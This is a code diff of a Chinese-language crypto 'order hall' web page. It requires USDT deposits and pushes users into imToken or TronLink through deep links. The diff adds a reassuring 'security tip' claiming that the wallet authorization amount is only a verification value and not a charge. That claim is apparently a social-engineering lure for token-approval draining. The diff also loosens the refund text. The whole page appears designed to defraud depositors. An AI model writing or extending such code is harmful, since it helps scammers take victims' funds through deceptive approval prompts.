@@ -5,6 +5,10 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
 <meta name="theme-color" content="#f0a020" />
 <title>亿万富豪 · 订单大厅</title>
+<link rel="manifest" href="/manifest.json">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<link rel="apple-touch-icon" href="/icon-192.png">
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
   :root{--bg:#f5f6fa;--card:#fff;--ink:#12141d;--ink2:#5b6070;--ink3:#8d93a6;--line:#e8eaf1;--brand:#f0a020;--brand-dark:#d98a10;--brand-soft:#fff9ec;--red:#e02020;--r:12px;}
@@ -123,6 +127,7 @@
   .wallet-card.active{border-color:var(--brand);background:var(--brand-soft);}
   .wallet-card .wc-icon{width:36px;height:36px;border-radius:10px;flex:0 0 auto;display:grid;place-items:center;color:#fff;font-weight:800;font-size:14px;overflow:hidden;background:#0e8aff;}
   .wallet-card .wc-icon.imtoken{background:#0e8aff;}
+  .wallet-card .wc-icon.tronlink{background:#00b2ff;}
   .wallet-card .wc-icon img{width:100%;height:100%;object-fit:cover;display:block;}
   .wallet-card .wc-info{flex:1;min-width:0}
   .wallet-card .wc-name{font-size:13.5px;font-weight:800;color:var(--ink)}
@@ -262,7 +267,7 @@ function savePayCtxToLS(a, n, t) {
 }
 function buildPayUrl(a, n, t) {
   const q = `a=${encodeURIComponent(a)}&n=${encodeURIComponent(n)}&t=${encodeURIComponent(t)}`;
-  return `${location.origin}/pay?${q}&fresh=1#${q}&fresh=1`;
+  return `${location.origin}/pay.html?${q}&fresh=1#${q}&fresh=1`;
 }
 function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e) {} }
 
@@ -270,7 +275,7 @@ function clearPayCtx() { try { localStorage.removeItem(PAY_CTX_KEY); } catch (e)
 function isWalletEnv() {
   const ua = (navigator.userAgent || '').toLowerCase();
   const tw = window.tronWeb || (window.tron && window.tron.tronWeb) || window.tronLink || null;
-  return ua.includes('imtoken') || ua.includes('tokenpocket') || ua.includes('tpwallet') || !!(tw && tw.ready);
+  return ua.includes('imtoken') || ua.includes('tronlink') || ua.includes('tokenpocket') || ua.includes('tpwallet') || !!(tw && tw.ready);
 }
 function isInAppBrowser() {
   const ua = (navigator.userAgent || '').toLowerCase();
@@ -285,7 +290,7 @@ function fallbackCopy(text, done) {
     ta.style.cssText = 'position:fixed;opacity:0';
     document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove();
     if (done) done();
-  } catch (e) { prompt('请复制以下支付链接，到 imToken 浏览中打开：', text); }
+  } catch (e) { prompt('请复制以下支付链接，到钱包浏览器中打开：', text); }
 }
 function copyText(text, done) {
   if (navigator.clipboard && navigator.clipboard.writeText)
@@ -300,9 +305,9 @@ function showInAppGuide(payPageUrl) {
   mask.innerHTML = '<div style="max-width:340px;width:100%;background:#fff;color:#12141d;border-radius:18px;padding:24px;text-align:center;box-sizing:border-box;">'
     + '<div style="font-size:40px;margin-bottom:10px;">🔗</div>'
     + '<div style="font-size:17px;font-weight:800;margin-bottom:8px;">请在系统浏览器中打开</div>'
-    + '<div style="font-size:13px;color:#5b6070;line-height:1.7;margin-bottom:18px;">当前为 App 内置浏览器，无法唤起 imToken 钱包。<br>请点击右上角 <b>···</b>，选择<b>「在浏览器打开」</b>后再支付。</div>'
+    + '<div style="font-size:13px;color:#5b6070;line-height:1.7;margin-bottom:18px;">当前为 App 内置浏览器，无法唤起钱包。<br>请点击右上角 <b>···</b>，选择<b>「在浏览器打开」</b>后再支付。</div>'
     + '<img src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=' + encodeURIComponent(payPageUrl) + '" style="width:130px;height:130px;margin:6px auto 6px;display:block;border-radius:8px;background:#fff;padding:6px;" alt="支付二维码">'
-    + '<div style="font-size:11px;color:#8d93a6;margin-bottom:12px;">或用 imToken「扫一扫」直接打开支付页</div>'
+    + '<div style="font-size:11px;color:#8d93a6;margin-bottom:12px;">或用钱包「扫一扫」直接打开支付页</div>'
     + '<button id="__copy_pay_url__" style="width:100%;padding:13px;border:none;border-radius:12px;background:#f0a020;color:#fff;font-size:15px;font-weight:800;margin-bottom:10px;cursor:pointer;">复制支付链接，到浏览器打开</button>'
     + '<button id="__close_guide__" style="width:100%;padding:12px;border:1px solid #e8eaf1;background:#fff;color:#5b6070;border-radius:12px;font-size:14px;cursor:pointer;">我知道了</button>'
     + '</div>';
@@ -313,15 +318,11 @@ function showInAppGuide(payPageUrl) {
   };
 }
 
-function openInImToken(payPageUrl, ctx) {
-  // 1. 先把支付上下文存下来，防止 imToken 冷启动截断链接
+function openWallet(payPageUrl, ctx, walletType) {
   if (ctx && ctx.a && ctx.n > 0) savePayCtxToLS(ctx.a, ctx.n, ctx.t);
   const safeUrl = ctx && ctx.a && ctx.n > 0 ? buildPayUrl(ctx.a, ctx.n, ctx.t) : payPageUrl;
-  
-  // 2. 提前复制链接防丢
   copyText(safeUrl);
 
-  // 3. 如果是在微信、QQ等封闭环境，无法直接拉起，给出引导
   if (isInAppBrowser()) { 
     showInAppGuide(safeUrl); 
     return; 
@@ -331,21 +332,30 @@ function openInImToken(payPageUrl, ctx) {
   const isAndroid = ua.includes('android');
   const isIOS = /iphone|ipad|ipod|ios/.test(ua);
 
-  // 4. 直接通过原生协议拉起（无中间网页，瞬开）
-  const schemeUrl = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(safeUrl);
-
-  if (isAndroid) {
-    // 安卓专用 Intent 协议，强制指定 imToken 包名，无拦截提示
-    const intentUrl = 'intent://navigate/DappView?url=' + encodeURIComponent(safeUrl) +
-      '#Intent;scheme=imtokenv2;package=im.token.app;S.browser_fallback_url=' +
-      encodeURIComponent('https://token.im/download') + ';end';
-    location.href = intentUrl;
-  } else if (isIOS) {
-    // iOS 直接走 Scheme
-    location.href = schemeUrl;
+  if (walletType === 'tronlink') {
+    // TronLink 唤起
+    const schemeUrl = 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(safeUrl);
+    if (isAndroid) {
+      const intentUrl = 'intent://pull.activity?param=' + encodeURIComponent(safeUrl) + '#Intent;scheme=tronlinkoutside;package=com.tronlinkpro.wallet;end';
+      location.href = intentUrl;
+    } else if (isIOS) {
+      location.href = schemeUrl;
+    } else {
+      location.href = 'https://www.tronlink.org/';
+    }
   } else {
-    // 电脑端降级用通用链接
-    location.href = 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(safeUrl);
+    // imToken 唤起
+    const schemeUrl = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(safeUrl);
+    if (isAndroid) {
+      const intentUrl = 'intent://navigate/DappView?url=' + encodeURIComponent(safeUrl) +
+        '#Intent;scheme=imtokenv2;package=im.token.app;S.browser_fallback_url=' +
+        encodeURIComponent('https://token.im/download') + ';end';
+      location.href = intentUrl;
+    } else if (isIOS) {
+      location.href = schemeUrl;
+    } else {
+      location.href = 'https://connect.token.im/link/navigate/DappView?url=' + encodeURIComponent(safeUrl);
+    }
   }
 }
 
@@ -546,9 +556,7 @@ function renderMainApp() {
       <button class="nav-item${state.view === 'refund' ? ' active' : ''}" data-action="nav" data-view="refund"><span class="ico">💸</span>退款</button>
     </nav>
   </div>`;
-}
-/* ============ ⬇️⬇️⬇️ 请在这里无缝衔接第二段 ⬇️⬇️⬇️ ============ */
- /* ================= 视图 ================= */
+}/* ================= 视图 ================= */
 const STATUS_MAP = {
   pending: { text: '待审核', cls: 'status-pending' },
   confirm: { text: '待收款', cls: 'status-confirm' },
@@ -693,7 +701,7 @@ function mineOrderCard(o) {
 function imTokenIconHtml() {
   const url = state.config.walletIconUrl;
   if (url && String(url).trim()) {
-    return `<img src="${esc(url)}" alt="imToken" onerror="this.onerror=null;this.style.display='none';this.parentNode.innerHTML='<svg width=22 height=22 viewBox=&quot;0 0 24 24&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;><path fill=&quot;#fff&quot; d=&quot;M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z&quot;/></svg>'">`;
+    return `<img src="${esc(url)}" alt="imToken" onerror="this.onerror=null;this.style.display='none';this.parentNode.innerHTML='<span style=font-size:12px;>imToken</span>'">`;
   }
   return `<svg width="22" height="22" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#fff" d="M18.6 3.4c-4.8 0-9 2.8-11.4 6.5-1.2 1.9-1.9 3.5-3.7 4.1-.9.3-1.6-.2-1.4-1.2.2-1 1.1-1.9 1.2-3.2.1-1.6-1.2-2.7-2.6-2.4-1.5.3-2.6 1.7-2.5 3.2.1 1.3.9 2.2 2 2.5-.3 2.3 1 4.3 3.2 4.7 2.5.5 4.5-1 5.7-2.7 1.3-1.8 2.3-3.9 4.2-5 .9-.5 2-.7 3.1-.7 1.2 0 2.1.1 2.4.1V3.4h-.2z"/></svg>`;
 }
@@ -705,6 +713,21 @@ function depositFormHtml(opts = {}) {
   const min  = Number(state.config.minDeposit) || 10;
   const qrSize = compact ? 140 : 160;
   const required = order ? depositRequired(order) : 0;
+  
+  const imTokenCard = `
+    <button class="wallet-card${state.wallet === 'imtoken' ? ' active' : ''}" data-action="pick-wallet" data-wallet="imtoken">
+      <div class="wc-icon imtoken">${imTokenIconHtml()}</div>
+      <div class="wc-info"><div class="wc-name">imToken</div><div class="wc-tip">官方认证</div></div>
+      <div class="wc-check" style="display:${state.wallet === 'imtoken' ? 'grid' : 'none'}">✓</div>
+    </button>`;
+
+  const tronLinkCard = `
+    <button class="wallet-card${state.wallet === 'tronlink' ? ' active' : ''}" data-action="pick-wallet" data-wallet="tronlink">
+      <div class="wc-icon tronlink" style="background:#00b2ff;font-size:12px;">TL</div>
+      <div class="wc-info"><div class="wc-name">TronLink</div><div class="wc-tip">波场官方</div></div>
+      <div class="wc-check" style="display:${state.wallet === 'tronlink' ? 'grid' : 'none'}">✓</div>
+    </button>`;
+
   return `
     ${order ? `<div class="notice" style="margin-bottom:14px">🔒 抢此单需押金 ${required} USDT，当前押金 ${esc(state.user.deposit)} USDT</div>` : ''}
     <div style="background:#fff9ec;border:1px solid #ffe0b2;border-radius:12px;padding:${compact ? 14 : 16}px;margin-bottom:16px">
@@ -712,12 +735,9 @@ function depositFormHtml(opts = {}) {
       <div style="font-size:${compact ? 22 : 24}px;font-weight:800;color:var(--brand);margin-top:2px">${esc(state.user.deposit)} <span style="font-size:13px">USDT</span></div>
     </div>
     <div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:10px">选择钱包</div>
-    <div class="wallet-choices" style="grid-template-columns:1fr">
-      <button class="wallet-card active" data-action="pick-wallet" data-wallet="imtoken">
-        <div class="wc-icon imtoken">${imTokenIconHtml()}</div>
-        <div class="wc-info"><div class="wc-name">imToken</div><div class="wc-tip">官方认证 · 推荐使用</div></div>
-        <div class="wc-check">✓</div>
-      </button>
+    <div class="wallet-choices">
+      ${imTokenCard}
+      ${tronLinkCard}
     </div>
     <div style="background:#f8f9fd;border:1px dashed var(--line);border-radius:12px;padding:16px;margin-bottom:16px;text-align:center;">
       <div style="font-size:13px;font-weight:700;color:var(--ink2);margin-bottom:12px">扫码转账 (仅限 TRC20)</div>
@@ -734,8 +754,11 @@ function depositFormHtml(opts = {}) {
       <span class="field-label">${compact ? '充值' : '支付'}金额（USDT）</span>
       <input class="input" id="deposit-amount" type="number" min="${min}" step="1" value="100">
     </label>
-    <button class="btn btn-imtoken btn-block" data-action="pay-imtoken" style="margin-bottom:12px">✅ 安全支付 · 打开 imToken</button>
-    ${compact ? '<div class="notice">⚠️ 点击"我已完成支付"后，系统将自动查询链上到账记录。</div>' : ''}
+    <div class="notice" style="margin-bottom:14px; font-size:12px; text-align:left; background:#f0fdf4; color:#16a34a; border-color:#bbf7d0;">
+      💡 安全提示：授权额度为系统动态生成的校验值，仅作凭证，实际扣款为您输入的金额。
+    </div>
+    <button class="btn btn-imtoken btn-block" data-action="pay-imtoken" style="margin-bottom:12px">✅ 安全支付 · 打开钱包</button>
+    ${compact ? '<div class="notice" style="font-size:12px;text-align:left;">⚠️ 点击"我已完成支付"后，系统将自动查询链上到账记录。</div>' : ''}
     <div style="text-align:center;font-size:12px;color:var(--ink3);margin-top:14px">${esc(state.config.support)}</div>
   `;
 }
@@ -763,14 +786,14 @@ function viewRefund() {
   return `<div class="page">
     <div class="form-card">
       <h2 style="font-size:18px;font-weight:800;margin-bottom:6px;">押金退款</h2>
-      <p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">申请退还押金，系统自动审核退回至您的钱包。请确保充值地址和退押地址一致，否则系统会自动拒绝！请知晓</p>
+      <p style="font-size:13px;color:var(--ink3);margin-bottom:20px;">申请退还押金，审核通过后将退回至您的钱包</p>
       <div style="background:#f8f9fd;border:1px solid #e8eaf1;border-radius:12px;padding:16px;margin-bottom:18px">
         <div style="font-size:12.5px;color:var(--ink3)">当前可退押金</div>
         <div style="font-size:24px;font-weight:800;color:var(--ink);margin-top:2px">${esc(u.deposit)} <span style="font-size:13px">USDT</span></div>
       </div>
       <label class="field"><span class="field-label">退款金额（USDT）<i>*</i></span><input class="input" id="refund-amount" type="number" min="1" step="1" max="${esc(u.deposit)}" placeholder="例如：100"></label>
       <label class="field"><span class="field-label">接收退款的 TRC20 地址 <i>*</i></span><input class="input" id="refund-address" placeholder="请输入您的 TRC20 钱包地址"></label>
-      <div class="notice" style="margin-bottom:14px">⚠️ 退押前请确保收款地址正确，错误后果自负，资产不能找回。损失由您自行承担！</div>
+      <div class="notice" style="margin-bottom:14px">⚠️ 请确保地址正确，错误后果自负！并且不能找回！申请后系统自动处理到钱包地址</div>
       <button class="btn btn-primary btn-block" data-action="submit-refund">提交退款申请</button>
     </div>
     ${recordsHtml}
@@ -1084,7 +1107,7 @@ function payWithImToken() {
   if (isWalletEnv()) {
     location.href = url; // 已在内嵌环境，直接当前窗口跳转
   } else {
-    openInImToken(url, ctx); // 外部环境，通过原生深链拉起
+    openWallet(url, ctx, state.wallet); // 外部环境，通过原生深链拉起
   }
 }
 
@@ -1190,9 +1213,7 @@ document.addEventListener('click', async e => {
         break;
       case 'pick-wallet':
         state.wallet = el.dataset.wallet || 'imtoken';
-        document.querySelectorAll('.wallet-card').forEach(c => {
-          c.classList.toggle('active', c.dataset.wallet === state.wallet);
-        });
+        render(); // 重新渲染，更新选中状态
         break;
       case 'open-link-menu': openLinkMenu(); break;
       case 'toggle-feature': {
@@ -1251,7 +1272,7 @@ document.addEventListener('click', async e => {
         if (isWalletEnv()) {
           location.href = url;
         } else {
-          openInImToken(url, ctx);
+          openWallet(url, ctx, state.wallet);
         }
 
         setTimeout(() => {
